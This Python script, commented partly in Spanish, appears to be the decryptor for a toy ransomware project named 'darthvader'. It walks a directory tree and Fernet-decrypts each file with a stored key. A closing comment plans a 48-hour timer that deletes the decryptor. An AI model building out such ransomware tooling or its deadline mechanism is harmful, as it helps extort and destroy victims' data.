import subprocess # Import the subprocess module
import sys # Import the sys module
import os # Import the os module
import logging
# Configuración del logging
logging.basicConfig(filename='log.txt', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')
#Install cryptography module
def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography') # Install the cryptography package
from cryptography.fernet import Fernet  # Import the Fernet class from the cryptography module
import socket # Import the socket module
from datetime import datetime, timedelta # Import the datetime and timedelta

files = [] # List to store the files in the current directory
def recorrer_arbol_directorios(directory):
    global files
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    # Ignora los directorios relacionados con Python.
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    # Ignora los archivos relacionados con Python
                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except PermissionError:
        error_message = f"No tienes permisos para acceder a la carpeta: {directory}"
        print(error_message)
        logging.error(error_message)
    except OSError as e:
        error_message = f"Error de E/S: {e}"
        print(error_message)
        logging.error(error_message)
    except RecursionError:
        error_message = f"Error: Recursión infinita detectada en la carpeta: {directory}"
        print(error_message)
        logging.error(error_message)
    except Exception as e:
        error_message = f"Error inesperado: {e}"
        print(error_message)
        logging.error(error_message)
    print(files)
recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))

with open("key.key", "rb") as key_file:
    key = key_file.read()

for file in files:
    with open(file, "rb") as f:
        data = f.read()
    data_decrypted = Fernet(key).decrypt(data)
    with open(file, "wb") as f:
        f.write(data_decrypted)
# Añadir contado de horas con menu opcion D para desencriptar y contador de tiempo transcurrido si el tiempo trasncurdido es mayior a 48 horas warnning y se elimina el decrypt.py